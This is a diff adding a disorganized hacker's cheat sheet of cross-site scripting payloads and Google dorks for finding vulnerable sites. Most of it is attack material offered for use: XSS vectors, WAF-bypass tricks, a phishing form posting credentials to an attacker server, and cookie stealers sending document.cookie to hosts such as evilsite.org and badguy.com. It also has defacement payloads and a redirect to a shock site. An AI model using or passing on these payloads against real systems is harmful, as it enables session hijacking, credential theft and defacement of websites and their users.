@@ -1,0 +1,350 @@
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+
+<h3>Please Enter Your Username and Password to Proceed:</h3><form method="POST" 
+action="http://attackerserver/login.php">Username: <input type="text" name="username" /><br />Password: <input type="password" 
+name="password" /><br /><input type="submit" value="Login" /></form><!--
+
+
+<svg%0Aonload=location=/java/.source%2b/script/.source%2blocation.hash[1]%2b/al/.source%2b/ert/.source%2blocation.hash[2]%2b/docu/.source%2b/ment.domain/.source%2blocation.hash[3]//#:()
+
+<svg%0Aonload=location=/java/.source%2b/script/.source%2blocation.hash[1]%2b/al/.source%2b/ert/.source%2blocation.hash[2]%2b/docu/.source%2b/ment.domain/.source%2blocation.hash[3]//#:()
+
+
+google payload :- X;,%20USER_CONTROLLED_COOKIE_NAME=<script>alert('XSS')</script>;,DUMMY=
+
+
+http://cureblog.de/openssh-user-enumeration-time-based-attack/
+http://www.gossamer-threads.com/lists/fulldisc/full-disclosure/
+
+{Cross-Site Scripting (WASC-08):
+
+http://site/path/images/js/swfupload/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
+
+http://site/path/images/js/swfupload/swfupload.swf?buttonText=%3Ca%20href=%27javascript:alert(document.cookie)%27%3EClick%20me%3C/a%3E
+
+Content Spoofing (WASC-12):
+
+http://site/path/images/js/swfupload/swfupload.swf?buttonText=test%3Cimg%20src=%27http://demo.swfupload.org/v220/images/logo.gif%27%3E
+
+http://site/path/images/js/swfupload/swfupload.swf?buttonImageURL=http://demo.swfupload.org/v220/images/logo.gif
+}
+
+"><svg/onload=alert(1)>
+
+'><a+href%3D'vbscript%3Aalert("XSS")'><font+size%3D"100"+>Click+Me+For+XSS<%2Ffont><%2Fa><>
+'><a+href%3D'javascript%3Aprompt(1)'><font+size%3D"40"+>XSS<%2Ffont><%2Fa><>
+
+http://www.google.com/news/directory?
+
+
+<META  http-quiv="refresh"content="0;URL=http://www.yaho.com">
+<iframe src="http://www.yahoo.com"></iframe>
+
+player.swf xss :-
+dork :- site:abc.com inurl:player.swf?
+payload:- ?debug=alert%28document.cookie%29
+?eventhandler=javascript.alert(document.cookie)//
+
+<STYLE>li {list-style-image: url("javascript:alert('XSS & SQLI IN STATE BANK OF PAKISTAN')");}</STYLE><UL><LI>XSS
+
+The Mod_Security firewall is one of the most known WAF around, It has an
+online smoke test where we can check if a vector bypassed the regular
+expressions. 
+Payload: 
+It was though detecting null bytes, but it was generating a false positive
+marking an xss attack as a SQL Injection attack. 
+The payload that was injected was:
+  
+<scri pt>confirm(0);</scri pt>
+
+">></script>alert(10);</script>
+
+
+
+I changed alert/eval to confirm, because alert was being detected but
+prompt and confirm were not being detected.
+
+
+Html injection codes:-
+<font face="System" size="5" color="Yellow">Security Is Lulz</font>
+
+for comment box xss cheat code :- xxxxxxxx"><//
+
+/xss-gaining-access-to-httponly-cookie.html :- 
+<script>var ck= "";function getc(s){ck = s;alert("XSS HttpOnly-Cookie Stealer:\n\n" + ck);}</script><applet code=HO.class archive=HO.jar width=0 height=0><param name=u value=http://attacker.in/xss/cookie.php></applet>
+*/
+
+http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html
+
+comment=“Nice site! <SCRIPT> window.open( http://badguy.com/info.pl?document.cookie </SCRIPT>
+
+
+ > <h1>XSSed By Bluff Master Hacker</h1> <script>alert("Hacked")</script> <iframe src="URL_HERE"
+
+&lt;script&gt;alert&#40;1&#41;&lt;/script&gt;
+
+http://www.slideshare.net/null0x00
+
+http://www.slideshare.net/null0x00/make-profit-with-uiredressing-attacks#btnNext :- clickjacking vul. pdf file 
+http://sectheory.com/clickjacking.htm :- abt  clickjacking vul
+http://www.slideshare.net/guestdb261a/csrfrsa2008jeremiahgrossman
+
+http://yehg.net/lab/pr0js/pentest/cross_site_framing.php :- imp. website for testong
+
+http://mssto.112.2o7.net/b/ss/msstoerrors/1/H.20.2--NS/0
+
+XSS Dorks and Cheats COLEECTED BY BB HACKER
+
+http://connect.microsoft.com/VisualStudio/feedback/details/534086/editing-existing-aspx-regenerates-designer-cs-good-but-most-of-the-controls-are-now-missing-bad
+
+https://mspartner.microsoft.com/en/uk/Pages/index.aspx
+www.site.aspx#"<img src=x onerror=prompt(0);>
+look for DOM xss
+<script>var val= 1; alert(val)</script>
+<script>alert(String.fromCharCode(120, 115, 115)</script>
+
+<a onclick="document.location='http://127.0.0.1/collect_cookie.php?
+cookie='+escape(document.cookie);" href="#">Click here for Details</a> :- dis is not hidden from the script.
+
+<iframe width='0' height='0' frameborder='0'
+src='<script>document.location='http://127.0.0.1/collect_cookie.php?
+cookie='+escape(document.cookie);</script>' />  :- dis script is hidden from the victim.
+
+
+
+http://www.srsparivar.com/srila.php
+http://www.yougetsignal.com/tools/web-sites-on-web-server/
+for checking a website have persistent xss or not..use d below script.
+<script>window.location="http://pastehtml.com/view/cc17j8ilj.html";</script>
+
+1.)F_SearchString='%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"<'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+
+
+2.)%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3C%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E
+3.)lingua=en&IDsezione=6&IDutente&IDinsegnamento&IDgruppo_pass=coded32">&IDutente_responsabile=coded32"><script>alert(document.cookie)<%2Fscript>
+4.)<html>+<body>++<h1>HACKED+BY+parveen+yadav!<%2Fh1>+<img+src%3D"http%3A%2F%2Fwww.nation.com.pk%2Fdigital_images%2F480%2F2012-01-10%2Findian-hackers-fell-dgpr-website-1326191046-2428.jpg">++<%2Fbody>+<%2Fhtml> 
+
+
+
+XSS Dorks
+Code:
+
+inurl:".php?cmd="
+inurl:".php?z="
+inurl:".php?q="
+inurl:".php?search="
+inurl:".php?query="
+inurl:".php?searchstring="
+inurl:".php?keyword="
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback="
+inurl:".php?mail="
+inurl:".php?cat="
+inurl:".php?vote="
+inurl:search.php?q=
+inurl:com_feedpostold/feedpost.php?url=
+inurl:scrapbook.php?id=
+inurl:headersearch.php?sid=
+inurl:/poll/default.asp?catid=
+inurl:/search_results.php?search=
+
+XSS Cheats
+Code:
+
+<script><h1><marquee><font color="red"><u>HaHa
+<script>IF_HTML_FUNCTION?<h1><marquee><font color="red"><u>HaHa 
+<script><BODY onLoad="var a = 'x68x74x74x70x3ax2fx2f' + 'x77x77x77x2e' + 'goatse' + 'x2efr'; location.href = a;"
+<script><h1><marquee style="position: absolute; top: 0px; bottom: 0px; left: 0px; z-index: 9999999; right: 0px; background-color: rgb(0, 0, 0);"><font style:="font-size:60px" color="red"><u style="">*TEXT HERE*<script>
+
+'';!--"<XSS>=&{()}
+
+'>//\\,<'>">">"*"
+
+'); alert('XSS
+
+<script>alert(1);</script>
+
+<script>alert('XSS');</script>
+
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC=javascript:alert('XSS')>
+
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+<script src="http://www.evilsite.org/cookiegrabber.php"></script>
+
+<script>location.href="http://www.evilsite.org/cookiegrabber.php?cookie"+escape(document.cookie)</script>
+
+<scr<script>ipt>alert('XSS');</scr</script>ipt>
+
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+<img src=foo.png onerror=alert(/xssed/) />
+
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
+
+<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
+
+<marquee><script>alert('XSS')</script></marquee>
+
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+"><script>alert(0)</script>
+
+<script src=http://yoursite.com/your_files.js></script>
+
+</title><script>alert(/xss/)</script>
+
+</textarea><script>alert(/xss/)</script>
+
+<IMG LOWSRC=\"javascript:alert('XSS')\">
+
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+
+<font style='color:expression(alert(document.cookie))'>
+
+<img src="javascript:alert('XSS')">
+
+<script language="JavaScript">alert('XSS')</script>
+
+<body onunload="javascript:alert('XSS');">
+
+<body onLoad="alert('XSS');"
+
+[color=red' onmouseover="alert('xss')"]mouse over[/color]
+
+"/></a></><img src=1.gif onerror=alert(1)>
+"/></a></><img src=http://www.hansik.com.hk/upload_files/restaurant/n64/153bd09c8ba220.jpg onerror=alert(1)>
+
+window.alert("Bonjour !");
+
+window.alert("Bonjour !");
+
+<div style="x:expression((window.r==1)?'':eval('r=1;
+
+alert(String.fromCharCode(88,83,83));'))">
+
+<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
+
+"><script alert(String.fromCharCode(88,83,83))</script>
+
+'>><marquee><h1>XSS</h1></marquee>
+
+'">><script>alert('XSS')</script>
+
+'">><marquee><h1>XSS</h1></marquee>
+
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
+
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
+
+<script>var var = 1; alert(var)</script>
+
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+
+<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
+
+<IMG SRC='vbscript:msgbox(\"XSS\")'>
+
+" onfocus=alert(document.domain) "> <"
+
+<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
+
+<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
+
+perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
+
+perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
+
+<br size=\"&{alert('XSS')}\">
+
+<scrscriptipt>alert(1)</scrscriptipt>
+
+</br style=a:expression(alert())>
+
+</script><script>alert(1)</script>
+
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+[color=red width=expression(alert(123))][color]
+
+<BASE HREF="javascript:alert('XSS');//">
+
+Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+
+"></iframe><script>alert(123)</script>
+
+<body onLoad="while(true) alert('XSS');">
+
+'"></title><script>alert(1111)</script>
+
+</textarea>'"><script>alert(document.cookie)</script>
+
+'""><script language="JavaScript"> alert('X \nS \nS');</script>
+
+</script></script><<<<script><>>>><<<script>alert(123)</script>
+
+<html><noalert><noscript>(123)</noscript><script>(123)</script>
+
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+
+'></select><script>alert(123)</script>
+
+	
+
+}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+
+<SCRIPT>document.write("XSS");</SCRIPT>
+
+a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
+
+='><script>alert("xss")</script>
+
+<script+src=">"+src="http://yoursite.com/xss.js?69%2C69"></script>
+
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
+
+">/XaDoS/><script>alert(document.cookie)</script><script src="http://ha.ckers.org/xss.js"></script>
+
+">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
+
+src="http://www.site.com/XSS.js"></script>
+
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+
+!--" /><script>alert('xss');</script>
+
+<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+
+"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+
+'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+
+<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+
+<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
+
+"><script>alert(1337)</script>"><script>alert("XSS by m3\nxss</h1></marquee>
+
+'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+
+<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
